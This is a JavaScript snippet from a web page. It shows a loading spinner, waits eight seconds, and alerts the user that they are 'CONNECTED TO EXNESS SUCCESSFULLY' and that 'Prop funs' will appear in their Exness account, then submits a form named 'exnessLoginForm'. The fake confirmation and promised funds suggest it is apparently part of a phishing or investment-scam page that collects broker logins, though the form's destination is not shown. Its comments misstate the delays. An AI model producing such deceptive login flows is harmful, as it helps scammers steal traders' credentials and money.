    <script>
        function showLoadingSpinner() {
            // Show the spinner
            document.getElementById("spinner").style.display = "block";
            
            // Prevent the form from submitting immediately
            event.preventDefault();

            // Simulate a loading process (e.g., 2 seconds delay)
            setTimeout(function() {
                // Hide the spinner
                document.getElementById("spinner").style.display = "none";
                
                  // Show success message as an alert
                  alert("CONNECTED TO EXNESS SUCCESSFULLY, Prop funs will display in you exness account in less than 24hours");

                // Optionally, after a delay, submit the form (this simulates a successful connection)
                setTimeout(function() {
                    document.getElementById("exnessLoginForm").submit();  // Submit the form after success message
                }, 1000); // Wait for 1.5 seconds before submitting the form
            }, 8000); // Simulate 2 seconds loading time
        }
    </script>
